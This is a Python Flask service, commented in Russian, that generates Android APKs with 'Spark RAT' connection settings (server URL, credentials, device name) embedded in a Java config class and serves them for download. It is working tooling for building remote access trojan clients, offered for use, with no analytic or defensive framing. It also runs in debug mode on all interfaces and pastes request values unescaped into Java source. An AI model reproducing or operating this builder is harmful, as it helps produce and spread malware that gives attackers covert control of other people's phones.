#!/usr/bin/env python3
"""
Android Builder API для генерации APK
Создает Android APK с вшитыми настройками Spark RAT
"""

import os
import json
import zipfile
import tempfile
import shutil
import base64
import hashlib
import subprocess
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Конфигурация
ANDROID_PROJECT_TEMPLATE = "android_template"
OUTPUT_DIR = "generated_apks"
TEMP_DIR = "temp_build"

# Создаем необходимые директории
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(TEMP_DIR, exist_ok=True)

def generate_device_id(username, password, device_name):
    """Генерирует уникальный ID устройства"""
    data = f"{username}:{password}:{device_name}:{datetime.now().isoformat()}"
    return hashlib.sha256(data.encode()).hexdigest()

def create_android_project(config):
    """Создает Android проект с вшитыми настройками"""
    project_name = f"spark_android_{int(datetime.now().timestamp())}"
    project_path = os.path.join(TEMP_DIR, project_name)
    
    # Копируем шаблон проекта
    if os.path.exists(ANDROID_PROJECT_TEMPLATE):
        shutil.copytree(ANDROID_PROJECT_TEMPLATE, project_path)
    else:
        # Создаем базовую структуру проекта
        create_basic_android_structure(project_path)
    
    # Встраиваем конфигурацию в код
    embed_config_in_code(project_path, config)
    
    return project_path

def create_basic_android_structure(project_path):
    """Создает базовую структуру Android проекта"""
    dirs = [
        "app/src/main/java/com/spark/android",
        "app/src/main/res/layout",
        "app/src/main/res/values",
        "app/src/main/res/mipmap-hdpi",
        "app/src/main/res/mipmap-mdpi",
        "app/src/main/res/mipmap-xhdpi",
        "app/src/main/res/mipmap-xxhdpi",
        "app/src/main/res/mipmap-xxxhdpi",
        "app/src/main/assets",
        "gradle/wrapper"
    ]
    
    for dir_path in dirs:
        os.makedirs(os.path.join(project_path, dir_path), exist_ok=True)

def embed_config_in_code(project_path, config):
    """Встраивает конфигурацию в исходный код Android приложения"""
    
    # Создаем файл конфигурации
    config_content = f"""
package com.spark.android;

public class SparkConfig {{
    public static final String SERVER_URL = "{config['serverUrl']}";
    public static final String USERNAME = "{config['username']}";
    public static final String PASSWORD = "{config['password']}";
    public static final String DEVICE_NAME = "{config['deviceName']}";
    public static final String DEVICE_ID = "{generate_device_id(config['username'], config['password'], config['deviceName'])}";
    public static final String ARCH = "{config['arch']}";
}}
"""
    
    config_file = os.path.join(project_path, "app/src/main/java/com/spark/android/SparkConfig.java")
    with open(config_file, 'w', encoding='utf-8') as f:
        f.write(config_content)

def build_apk(project_path, config):
    """Собирает APK из проекта"""
    try:
        # Проверяем наличие Android SDK
        if not check_android_sdk():
            raise Exception("Android SDK не найден. Установите Android SDK и настройте ANDROID_HOME")
        
        # Переходим в директорию проекта
        os.chdir(project_path)
        
        # Собираем APK
        cmd = ["./gradlew", "assembleRelease"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        if result.returncode != 0:
            raise Exception(f"Ошибка сборки: {result.stderr}")
        
        # Ищем собранный APK
        apk_path = os.path.join(project_path, "app/build/outputs/apk/release/app-release.apk")
        
        if not os.path.exists(apk_path):
            raise Exception("APK файл не найден после сборки")
        
        # Копируем APK в output директорию
        output_filename = f"spark-android-{config['deviceName'].replace(' ', '_')}-{int(datetime.now().timestamp())}.apk"
        output_path = os.path.join(OUTPUT_DIR, output_filename)
        
        shutil.copy2(apk_path, output_path)
        return output_path
        
    except subprocess.TimeoutExpired:
        raise Exception("Таймаут при сборке APK")
    except Exception as e:
        raise Exception(f"Ошибка при сборке APK: {str(e)}")

def check_android_sdk():
    """Проверяет наличие Android SDK"""
    android_home = os.environ.get('ANDROID_HOME')
    if not android_home:
        # Пытаемся найти SDK в стандартных местах
        common_paths = [
            "C:\\Users\\{}\\AppData\\Local\\Android\\Sdk".format(os.getenv('USERNAME', '')),
            "/Users/{}/Library/Android/sdk".format(os.getenv('USER', '')),
            "/opt/android-sdk",
            "/usr/local/android-sdk"
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                os.environ['ANDROID_HOME'] = path
                return True
        
        return False
    
    return os.path.exists(android_home)

@app.route('/api/android/generate', methods=['POST'])
def generate_apk():
    """API endpoint для генерации Android APK"""
    try:
        config = request.get_json()
        
        # Валидация входных данных
        required_fields = ['serverUrl', 'username', 'password', 'deviceName', 'arch']
        for field in required_fields:
            if field not in config or not config[field]:
                return jsonify({
                    'code': -1,
                    'msg': f'Отсутствует обязательное поле: {field}'
                }), 400
        
        # Проверяем URL
        try:
            from urllib.parse import urlparse
            parsed = urlparse(config['serverUrl'])
            if not parsed.scheme or not parsed.netloc:
                raise ValueError()
        except:
            return jsonify({
                'code': -1,
                'msg': 'Некорректный URL сервера'
            }), 400
        
        # Создаем проект и собираем APK
        project_path = create_android_project(config)
        apk_path = build_apk(project_path, config)
        
        # Очищаем временные файлы
        try:
            shutil.rmtree(project_path)
        except:
            pass
        
        # Возвращаем ссылку для скачивания
        download_url = f"/api/android/download/{os.path.basename(apk_path)}"
        
        return jsonify({
            'code': 0,
            'data': {
                'downloadUrl': download_url,
                'fileName': os.path.basename(apk_path),
                'fileSize': os.path.getsize(apk_path),
                'deviceId': generate_device_id(config['username'], config['password'], config['deviceName'])
            }
        })
        
    except Exception as e:
        return jsonify({
            'code': 1,
            'msg': str(e)
        }), 500

@app.route('/api/android/download/<filename>')
def download_apk(filename):
    """Скачивание сгенерированного APK"""
    try:
        file_path = os.path.join(OUTPUT_DIR, secure_filename(filename))
        if not os.path.exists(file_path):
            return jsonify({'error': 'Файл не найден'}), 404
        
        return send_file(file_path, as_attachment=True, download_name=filename)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android/cleanup', methods=['POST'])
def cleanup_old_apks():
    """Очистка старых APK файлов"""
    try:
        # Удаляем APK старше 24 часов
        cutoff_time = datetime.now().timestamp() - (24 * 60 * 60)
        
        deleted_count = 0
        for filename in os.listdir(OUTPUT_DIR):
            file_path = os.path.join(OUTPUT_DIR, filename)
            if os.path.isfile(file_path) and os.path.getmtime(file_path) < cutoff_time:
                os.remove(file_path)
                deleted_count += 1
        
        return jsonify({
            'code': 0,
            'data': {'deletedCount': deleted_count}
        })
        
    except Exception as e:
        return jsonify({
            'code': 1,
            'msg': str(e)
        }), 500

@app.route('/api/android/health')
def health_check():
    """Проверка состояния API"""
    return jsonify({
        'code': 0,
        'data': {
            'status': 'healthy',
            'sdk_available': check_android_sdk(),
            'output_dir': OUTPUT_DIR
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)